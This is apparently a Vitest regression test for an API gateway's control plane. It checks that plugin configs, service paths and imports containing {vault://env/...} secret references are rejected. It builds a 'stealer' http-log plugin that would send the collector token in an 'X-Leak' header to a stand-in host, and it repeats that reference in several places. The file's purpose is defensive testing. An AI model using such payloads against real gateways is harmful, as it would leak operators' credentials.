import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startHarness, uniq, type Harness } from "./harness.js";

// Hotfix F-1: a user plugin with {vault://env/...} would read the gateway's environment, e.g. the collector token.
let h: Harness;
beforeAll(async () => {
  h = await startHarness({ platformHttpLogEndpoint: "http://gromesh-collector:8080/kong" });
});
afterAll(async () => {
  await h?.close();
});

async function env(): Promise<string> {
  const res = await h.api("POST", "/environments", { name: uniq("vault") });
  expect(res.status).toBe(201);
  return res.body.id as string;
}

const paths = (body: { errors?: { path: string }[] }) => (body.errors ?? []).map((e) => e.path);
const stealer = (header: string) => ({
  name: "http-log",
  config: { http_endpoint: "http://logs.example.com/in", headers: { "X-Leak": header } },
});

describe("vault references in plugin config", () => {
  it("refuses them on create and replace, at the field's path, and accepts ordinary values", async () => {
    const envId = await env();
    const created = await h.api("POST", `/environments/${envId}/plugins`, stealer("{vault://env/gromesh-collector-token}"));
    expect(created.status).toBe(422);
    expect(paths(created.body)).toEqual(["config.headers.X-Leak"]);
    const nested = await h.api("POST", `/environments/${envId}/plugins`, {
      name: "pre-function", config: { access: ["return 1", "local t = '{vault://env/gromesh-collector-token}'"] },
    });
    expect(nested.status).toBe(422);
    expect(paths(nested.body)).toEqual(["config.access.1"]);
    const ok = await h.api("POST", `/environments/${envId}/plugins`, stealer("static-value"));
    expect(ok.status).toBe(201);
    const replaced = await h.api("PUT", `/environments/${envId}/plugins/${ok.body.id}`, stealer("prefix {vault://env/x}"));
    expect(replaced.status).toBe(422);
    expect((await h.api("GET", `/environments/${envId}/plugins/${ok.body.id}`)).body.config.headers["X-Leak"]).toBe("static-value");
  });

  it("does not publish a row written before the rule existed, while the platform plugin keeps its own reference", async () => {
    const envId = await env();
    await h.sql.query("insert into plugins (environment_id, name, config) values ($1, 'http-log', $2::jsonb)", [
      envId, JSON.stringify(stealer("{vault://env/gromesh-collector-token}").config),
    ]);
    const res = await h.api("POST", `/environments/${envId}/snapshots`, {});
    expect(res.status).toBe(422);
    expect(paths(res.body)).toEqual(["plugins[0].config.headers.X-Leak"]);
    await h.sql.query("delete from plugins where environment_id = $1", [envId]);
    const published = await h.api("POST", `/environments/${envId}/snapshots`, {});
    expect(published.status).toBe(201);
    const snapshot = await h.api("GET", `/environments/${envId}/snapshots/${published.body.version}`);
    const platform = snapshot.body.config.plugins.find((p: { name: string }) => p.name === "http-log");
    expect(platform.config.headers).toEqual({ "X-Gromesh-Collector-Token": "{vault://env/gromesh-collector-token}" });
  });

  it("does not publish a reference in another entity either", async () => {
    const envId = await env();
    await h.sql.query("insert into services (environment_id, name, protocol, host, port, path) values ($1, 'svc', 'http', 'echo', 80, $2)", [
      envId, "/{vault://env/gromesh-collector-token}",
    ]);
    const res = await h.api("POST", `/environments/${envId}/snapshots`, {});
    expect(res.status).toBe(422);
    expect(paths(res.body)).toEqual(["services[0].path"]);
  });

  it("reports them at the document path on import, writing nothing", async () => {
    const envId = await env();
    const document = {
      apiVersion: "gromesh/v1", services: [], routes: [], consumers: [], upstreams: [], certificates: [],
      plugins: [stealer("{vault://env/gromesh-collector-token}")],
    };
    const dry = await h.api("POST", `/environments/${envId}/import`, { document, mode: "replace", dryRun: true });
    expect(dry.status).toBe(200);
    expect(paths(dry.body)).toEqual(["document.plugins.0.config.headers.X-Leak"]);
    expect((await h.api("POST", `/environments/${envId}/import`, { document, mode: "replace", dryRun: false })).status).toBe(422);
    expect((await h.api("GET", `/environments/${envId}/plugins`)).body.items).toEqual([]);
  });
});
